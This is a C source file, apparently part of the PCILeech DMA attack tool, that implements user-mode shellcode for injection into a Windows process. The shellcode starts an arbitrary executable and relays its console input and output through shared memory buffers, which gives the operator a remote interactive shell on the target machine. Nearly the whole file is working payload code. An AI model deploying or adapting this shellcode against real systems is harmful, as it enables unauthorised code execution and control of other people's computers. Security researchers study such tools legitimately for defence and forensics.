// wx64_umd_exec_c.c : usermode 'umd' shellcode for PCILeech for starting and
//                     and executing a process optionally with input redirect.
//                     NB! this feature is still 'experimental'. 
//
// (c) Ulf Frisk, 2019
// Author: Ulf Frisk, pcileech@frizk.net
//
/*

COMPILE WITH:

cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /c /TC wx64_umd_exec_c.c
ml64 wx64_umd_exec.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main "wx64_umd_exec_c.obj"
shellcode64.exe -o wx64_umd_exec.exe

*/
#include <windows.h>

typedef unsigned __int64		QWORD, *PQWORD;

/*
typedef struct tdUMD_EXEC_CONTEXT_LIMITED {
    CHAR fCMPXCHG;
    CHAR fEnableConsoleRedirect;            // config value set by pcileech
    CHAR fThreadIsActive;;
    CHAR fStatus;
    DWORD dwFlagsCreateProcessA;            // config value set by pcileech
    QWORD qwDEBUG;
    QWORD pInfoIn;
    QWORD pInfoOut;
    HANDLE hInWrite;
    HANDLE hOutRead;
    HANDLE hOutWriteCP;
    HANDLE hInReadCP;
    HANDLE hProcessHandle;
    struct {                                // config value set by pcileech
        QWORD CloseHandle;
        QWORD CreatePipe;
        QWORD CreateProcessA;
        QWORD CreateThread;
        QWORD GetExitCodeProcess;
        QWORD ReadFile;
        QWORD Sleep;
        QWORD WriteFile;
        QWORD LocalAlloc;
    } fn;
    CHAR szProcToStart[MAX_PATH];           // config value set by pcileech
} UMD_EXEC_CONTEXT_LIMITED, *PUMD_EXEC_CONTEXT_LIMITED;
*/

#define USERSHELL_BUFFER_IO_MAGIC       0x012651232dfef9521
#define USERSHELL_BUFFER_IO_MAGIC_EXIT  0x0feda22001337daac
#define USERSHELL_BUFFER_IO_SIZE        0x800
typedef struct tUSERSHELLBUFFERIO {
    QWORD qwMagic;
    QWORD cbRead;
    QWORD cbReadAck;
    QWORD qwDebug[10];
    BYTE  pb[];
} USERSHELL_BUFFER_IO, *PUSERSHELL_BUFFER_IO;

typedef struct tdUMD_EXEC_CONTEXT_HANDLES {
    HANDLE hInWrite;
    HANDLE hOutRead;
    HANDLE hOutWriteCP;
    HANDLE hInReadCP;
} UMD_EXEC_CONTEXT_HANDLES, *PUMD_EXEC_CONTEXT_HANDLES;

typedef struct tdUMD_EXEC_CONTEXT_FULL {
    CHAR fCMPXCHG;
    CHAR fEnableConsoleRedirect;            // config value set by pcileech
    CHAR fThreadIsActive;
    CHAR fStatus;
    DWORD dwFlagsCreateProcessA;            // config value set by pcileech
    QWORD qwDEBUG;
    PUSERSHELL_BUFFER_IO pInfoIn;
    PUSERSHELL_BUFFER_IO pInfoOut;
    HANDLE hInWrite;
    HANDLE hOutRead;
    HANDLE hOutWriteCP;
    HANDLE hInReadCP;
    HANDLE hProcessHandle;
    struct {                                // config value set by pcileech
        BOOL(*CloseHandle)(
            HANDLE hObject
            );
        BOOL(*CreatePipe)(
            _Out_    PHANDLE               hReadPipe,
            _Out_    PHANDLE               hWritePipe,
            _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,
            _In_     DWORD                 nSize
            );
        BOOL(*CreateProcessA)(
            LPCSTR                lpApplicationName,
            LPSTR                 lpCommandLine,
            LPSECURITY_ATTRIBUTES lpProcessAttributes,
            LPSECURITY_ATTRIBUTES lpThreadAttributes,
            BOOL                  bInheritHandles,
            DWORD                 dwCreationFlags,
            LPVOID                lpEnvironment,
            LPCSTR                lpCurrentDirectory,
            LPSTARTUPINFOA        lpStartupInfo,
            LPPROCESS_INFORMATION lpProcessInformation
            );
        HANDLE(*CreateThread)(
            LPSECURITY_ATTRIBUTES   lpThreadAttributes,
            SIZE_T                  dwStackSize,
            LPTHREAD_START_ROUTINE  lpStartAddress,
            __drv_aliasesMem LPVOID lpParameter,
            DWORD                   dwCreationFlags,
            LPDWORD                 lpThreadId
            );
        BOOL(*GetExitCodeProcess)(
            HANDLE  hProcess,
            LPDWORD lpExitCode
            );
        BOOL(*ReadFile)(
            HANDLE       hFile,
            LPVOID       lpBuffer,
            DWORD        nNumberOfBytesToRead,
            LPDWORD      lpNumberOfBytesRead,
            LPOVERLAPPED lpOverlapped
            );
        void(*Sleep)(
            DWORD dwMilliseconds
            );
        BOOL(*WriteFile)(
            HANDLE       hFile,
            LPCVOID      lpBuffer,
            DWORD        nNumberOfBytesToWrite,
            LPDWORD      lpNumberOfBytesWritten,
            LPOVERLAPPED lpOverlapped
            );
        HLOCAL(*LocalAlloc)(
            UINT   uFlags,
            SIZE_T uBytes
            );
    } fn;
    CHAR szProcToStart[MAX_PATH];           // config value set by pcileech
} UMD_EXEC_CONTEXT_FULL, *PUMD_EXEC_CONTEXT_FULL;

BOOL UserShellIsProcessRunning(PUMD_EXEC_CONTEXT_FULL ctx)
{
    DWORD dwExit;
    return ctx->fn.GetExitCodeProcess(ctx->hProcessHandle, &dwExit) && (dwExit == STILL_ACTIVE);
}

VOID UserShellCleanup(PUMD_EXEC_CONTEXT_FULL ctx)
{
    ctx->pInfoOut->qwMagic = 0;
    if(ctx->fThreadIsActive) {
        ctx->fThreadIsActive = 0;
        ctx->fn.CloseHandle(ctx->hOutRead);
        ctx->fn.CloseHandle(ctx->hInWrite);
        ctx->fn.CloseHandle(ctx->hOutWriteCP);
        ctx->fn.CloseHandle(ctx->hInReadCP);
    }
    ctx->pInfoIn->qwMagic = USERSHELL_BUFFER_IO_MAGIC_EXIT;
    ctx->pInfoOut->qwMagic = USERSHELL_BUFFER_IO_MAGIC_EXIT;
}

/*
* Execute binary specified in configuration
*/
inline BOOL UserShellExec(PUMD_EXEC_CONTEXT_FULL ctx)
{
    LPSTARTUPINFO psi = ctx->fn.LocalAlloc(LMEM_ZEROINIT, sizeof(STARTUPINFO));
    //STARTUPINFO si;
    PROCESS_INFORMATION pi;
    // set up data
    psi->cb = sizeof(STARTUPINFO);
    psi->dwFlags = STARTF_USESTDHANDLES;
    if(ctx->fEnableConsoleRedirect) {
        psi->hStdOutput = ctx->hOutWriteCP;
        psi->hStdInput = ctx->hInReadCP;
        psi->hStdError = ctx->hOutWriteCP;
    }
    // launch executable
    if(!ctx->fn.CreateProcessA(NULL, ctx->szProcToStart, NULL, NULL, TRUE, ctx->dwFlagsCreateProcessA, NULL, NULL, psi, &pi)) {
        return FALSE;
    }
    ctx->hProcessHandle = pi.hProcess;
    if(ctx->fEnableConsoleRedirect) {
        ctx->fn.CloseHandle(pi.hThread);
    }
    return TRUE;
}

// in buffer -> child process
VOID UserShellThreadWriter(PUMD_EXEC_CONTEXT_FULL ctx)
{
    DWORD cbWrite, cbModulo, cbModuloAck;
    while(ctx->fThreadIsActive && UserShellIsProcessRunning(ctx)) {
        if(ctx->pInfoIn->cbRead == ctx->pInfoOut->cbReadAck) {
            ctx->fn.Sleep(10);
            continue;
        }
        cbModulo = ctx->pInfoIn->cbRead % USERSHELL_BUFFER_IO_SIZE;
        cbModuloAck = ctx->pInfoOut->cbReadAck % USERSHELL_BUFFER_IO_SIZE;
        if(cbModuloAck < cbModulo) {
            if(!ctx->fn.WriteFile(ctx->hInWrite, ctx->pInfoIn->pb + cbModuloAck, cbModulo - cbModuloAck, &cbWrite, NULL)) {
                break;
            }
        } else {
            if(!ctx->fn.WriteFile(ctx->hInWrite, ctx->pInfoIn->pb + cbModuloAck, USERSHELL_BUFFER_IO_SIZE - cbModuloAck, &cbWrite, NULL)) {
                break;
            }
        }
        ctx->pInfoOut->cbReadAck += cbWrite;
    }
    UserShellCleanup(ctx);
}

// child process -> out buffer
VOID UserShellThreadReader(PUMD_EXEC_CONTEXT_FULL ctx)
{
    DWORD cbRead, cbModulo, cbModuloAck;
    while(ctx->fThreadIsActive && UserShellIsProcessRunning(ctx)) {
        cbModulo = ctx->pInfoOut->cbRead % USERSHELL_BUFFER_IO_SIZE;
        cbModuloAck = ctx->pInfoIn->cbReadAck % USERSHELL_BUFFER_IO_SIZE;
        if(cbModuloAck <= cbModulo) {
            if(!ctx->fn.ReadFile(ctx->hOutRead, ctx->pInfoOut->pb + cbModulo, USERSHELL_BUFFER_IO_SIZE - cbModulo, &cbRead, NULL)) {
                break;
            }
        } else {
            if(!ctx->fn.ReadFile(ctx->hOutRead, ctx->pInfoOut->pb + cbModulo, cbModuloAck - cbModuloAck, &cbRead, NULL)) {
                break;
            }
        }
        ctx->pInfoOut->cbRead += cbRead;
        while(((ctx->pInfoOut->cbRead - ctx->pInfoIn->cbReadAck) >= USERSHELL_BUFFER_IO_SIZE) && ctx->fThreadIsActive && UserShellIsProcessRunning(ctx)) {
            ctx->fn.Sleep(10);
        }
    }
    UserShellCleanup(ctx);
}

VOID c_EntryPoint(PUMD_EXEC_CONTEXT_FULL ctx)
{
    SECURITY_ATTRIBUTES sa;
    if(!ctx->fn.CloseHandle) { return; } // no function addresses -> invalid context!
    // Intialize console redirection #1/2
    if(ctx->fEnableConsoleRedirect) {
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        ctx->pInfoIn = (PUSERSHELL_BUFFER_IO)ctx->fn.LocalAlloc(LMEM_ZEROINIT, 0x2000);
        ctx->pInfoOut = (PUSERSHELL_BUFFER_IO)(0x1000 + (QWORD)ctx->pInfoIn);
        ctx->pInfoIn->qwMagic = USERSHELL_BUFFER_IO_MAGIC;
        ctx->pInfoOut->qwMagic = USERSHELL_BUFFER_IO_MAGIC;
        ctx->fn.CreatePipe(&ctx->hInReadCP, &ctx->hInWrite, &sa, 0x800);
        ctx->fn.CreatePipe(&ctx->hOutRead, &ctx->hOutWriteCP, &sa, 0x800);
        ctx->fThreadIsActive = 1;
    }
    // create process
    if(!UserShellExec(ctx)) {
        UserShellCleanup(ctx);
        ctx->fStatus = 0xff;
        return;
    }
    // Initalize console redirection #2/2
    if(ctx->fEnableConsoleRedirect) {
        ctx->fn.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&UserShellThreadWriter, ctx, 0, NULL);
        ctx->fn.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&UserShellThreadReader, ctx, 0, NULL);
    }
    ctx->fStatus = 0xff;
}
